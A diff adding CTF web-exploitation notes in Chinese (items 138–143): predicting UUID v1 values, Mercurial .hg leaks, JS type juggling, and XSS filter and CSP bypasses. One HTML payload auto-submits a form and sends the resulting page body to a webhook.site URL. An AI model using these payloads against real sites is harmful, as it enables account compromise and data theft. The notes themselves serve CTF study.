@@ -724,3 +724,50 @@ print('[+] flag:', binascii.unhexlify(res).decode())
 ```
 
 题目:[[HarekazeCTF2019]Sqlite Voting](https://blog.csdn.net/qq_46263951/article/details/119727922)
+
+138. [uuid v1](https://versprite.com/blog/universally-unique-identifiers/)是可以预测的,因此用v1版本的uuid做身份认证有被爆破预测uuid的风险。在js里，node ID和clock sequence如下给出：
+
+```js
+var adminuuid = uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
+//node=0x67696e6b6f69
+//clockseq=0b10101001100100=0x2a64,第一位会根据UUID variant变化
+```
+
+python里则是：
+
+```python
+UUIDv1 = str(uuid1(node=0x67696E6B6F69, clock_seq=0b10101001100100))
+```
+
+例题:[uuid hell](https://ctftime.org/writeup/36173)
+
+139. Mercurial SCM .hg文件夹泄露。Mercurial SCM也有一个和git类似的库管理命令：hg。注意它在遇见特殊字符时会转义，但是转义符是"_"。意味着一个名字包含一个下划线的文件最终文件名里会有两个下划线。例题:[my-chemical-romance](https://ctftime.org/writeup/36174)
+140. xss绕过[HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)和`default-src 'none'; script-src 'unsafe-inline'`[csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)设置。前者让我们无法document.cookie盗取admin cookie值，后者允许内嵌式js脚本，但不允许以任何形式加载文件，包括服务器自身的。意味着无法以任何常见的形式发送请求，比如常用的fetch。替代方式是以form的形式发送POST。
+
+```html
+<form method="post" id="theForm" action="/flag"></form> <!-- action填要访问的网址 -->
+<script> 
+    document.getElementById('theForm').submit();
+</script>
+```
+
+如果要打开的目标网页会重定向，可以考虑在代码中加入打开另一个窗口的操作，使用setTimeout函数保持当前网页脚本的运行，在打开的窗口中获取到flag。例如:
+
+```html
+<form method="post" id="theForm" action="/flag" target='bruh'>
+    <!-- Form body here -->
+</form>
+<script> 
+    let w = window.open('','bruh');
+    document.getElementById('theForm').submit();
+    setTimeout(()=>{
+        document.location= `https://webhook.site/645c6365-01c7-4535-a172-a9014e389741?c=${w.document.body.innerHTML}`
+    },500);
+</script>
+```
+
+例题:[california-state-police](https://blog.jaquiez.dev/Blog/LACTF2023/#CSP)
+
+141. js中的type juggling。审查源码时，可能会发现服务器期望输入变量是字符串等简单类型，但如果没有对变量做严格过滤，或是使用了express的`express.urlencoded()`（其extended属性默认接受复杂类型），就可以尝试攻击。例题:[queue up!](https://github.com/sambrow/ctf-writeups/blob/main/2023/la-ctf/queue-up.md)
+142. 当xss代码以innerHTML形式插入时，浏览器不会执行这样的代码。可以用`<img/src=1 onerror=function()>`替代。
+143. js的多行注释/\*\*/可用于绕过滤和跨多行执行xss，不过要注意，多行注释不要用在js关键字中间，例如`win/**/dow`。因为js会把/\*\*/解释为空格，window就失效了。例题:[hptla](https://blog.jaquiez.dev/Blog/LACTF2023/#hptla)
